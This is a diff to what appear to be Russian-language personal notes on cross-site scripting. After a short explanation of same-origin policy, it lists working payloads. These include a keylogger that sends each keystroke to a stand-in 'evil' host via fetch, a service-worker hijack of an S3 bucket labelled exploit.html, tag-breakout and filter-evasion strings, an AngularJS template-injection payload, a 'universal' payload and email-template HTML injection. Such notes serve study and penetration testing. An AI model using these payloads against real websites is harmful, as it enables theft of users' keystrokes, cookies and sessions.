@@ -144,6 +144,86 @@ $     %24
 "     %22
 space %20
 
+У JS есть доступ:
+localStorage.get('session_key')
+sessionStorage
+cookie
+есть доступ к любым http ответам с этого же Origin
+
+let xhr = new XMLHttpRequest();
+xhr.open('GET', '/page-b.html');
+xhr.send();
+xhr.onload = function() {
+    if (xhr.status != 200) {
+    } else {
+      console.log(xhr.responseText);
+    }
+  };
+  
+верхний код иначе
+<img src onerror='
+onkeypress=
+(e)=>{fetch("//evil?k="+String.fromCharCode(e.which))}
+,this.remove()
+'>
+
+document.write() => document.documentElement.innerHTML='' => document.body.innerHTML=''
+  
+Для разграничения доступа js между разными сайтами используется Origin
+Origin = protocol + hostname + port
+
+SOP - Same-Origin-Policy - фундаментальная защита которая используется в вебе
+JS, выполняемый на Origin https://site.ru:443 не может получить доступ к содержимому следующих Origin:
+https://google.com:443
+https://site.com:443
+ftp://site.ru:443
+https://site.ru:444
+https://my.site.ru:443
+
+Обходы SOP (CORS, WebSocet, PostMessage, JSONP, Flash)
+Куки, поставленные на одном порту можно прочитать на любом другом порту
+
+FOR S3 backet
+serviceworker.js
+self.addEventListener('fetch', function(event) {
+  event.respondWith(
+    new Response (
+      new Blob (
+        ["<iframe src='https://mysite.ru'",
+        ""]
+        {type:'text/html'}))
+    );
+  });
+  
+exploit.html
+<body>
+<script>navigator.serviceWorker.register(
+        '/serviceworker_...&X-Amz-Signature=...',
+        {scope:'/'}
+</script>
+</body>
+
+Закрываем следующие тэги
+<iframe>
+<noembed>
+<noscript>
+<style>
+<xmp>
+<script>
+<noframes>
+<textarea>
+<title>
+<plaintext>
+<template>
+<frameset>
+
+</noscript></style></scrip>....
+
+<img src onerror=alert()> - <img/src/onerror=alert()>
+<svg onload=alert()>
+
+
+document.body.innerHTML+="<img src onerror=alert('img')>"
 
 Основные методы вызова javascript из html
 
@@ -182,28 +262,39 @@ javascript: = &#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&colon
 %20javascript:alert(1)
 %09javascript:alert(1)
 
-iframe + обработчик (iframe - используется для того чтобы отобразить страницу внутри другой страницы)
-'"></title></script><iframe onload='alert’’'>
+iframe + обработчик (iframe - используется для того чтобы отобразить страницу внутри другой страницы), alert``
+'"></title></script><iframe onload='alert``'>
 <iframe srcdoc="&#x3C;script&#x3E;alert()&#x3C;/script&#x3E;">
-'"></title/</script/</style/><iframe/onload='alert’’'>
+'"></title/</script/</style/><iframe/onload='alert``'>
+<iframe src="data:text/html,<script>alert(location.origin)</script>"></iframe>
 
 Пробелы между аттрибутами в тэге могут заменить слэшем
 <iframe/onload='alert()' - необязательно закрывать тэг
 
 xss попадает внутрь комментария
-'"></title/</script/</style/--><iframe/onload='alert’’'>
+'"></title/</script/</style/--><iframe/onload='alert``'>
 
 xss AngularJS/VueJs (F12 - Console - angular.version)
 {{7*7}}
 {{constractor.constractor('alert()')()}}
 
-
-'"/test/></title/</script/</style/-->{{7*7}}<iframe/onload='alert’’'<!--
+Универсальная нагрузка
+'"/test/></title/</script/</style/-->{{7*7}}<iframe/onload='alert``'<!--
 
 Добавить код через расширение
 if(document.querySelectorAll('*[test]').length>0){
 prompt('XSS');
 }
+
+xss + base64, Regexp + base64
+
+Regexp
+document.cookie == document['cookie']
+document['location']=javascript:alert()
+
+Email template's html injection (server-side-template-injection) (${} #{}, обратить внимание на шаблонизаторы)
+Вставка html тэгов в шаблон письма - --></script><a href="//site.com">GO</a><img src=x>${7*7}{{7*7}}<!--
+<a href=//test> => http://test
 
 NULL <scri%00pt>alert()</scri%00pt>
 
